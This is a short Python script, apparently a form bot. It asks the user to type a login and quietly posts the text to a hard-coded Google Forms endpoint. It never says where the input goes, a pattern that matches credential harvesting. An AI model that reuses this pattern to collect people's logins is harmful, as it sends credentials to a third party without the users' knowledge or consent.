import requests
import json

def loginbot(dataStr):
    session = requests.Session()
    session.get("https://forms.gle/f4GV5Fut4b9V3eEm7")

    data = {
            'entry.2087753367':	dataStr,
            'fvv':'1',
            'draftResponse':'[null,null,\"-7478797354586800581\"]\r\n',
            'pageHistory':'0',
            'fbzx':'-7478797354586800581'
            }

    request = session.post(
        "https://docs.google.com/forms/d/e/1FAIpQLSeASyrsu98TJ6tMQ-7vayUJJ1aqL1PhbIlXrG7dqCDAJjZOJg/formResponse", data=data)

loginbot(input("Input login: "))

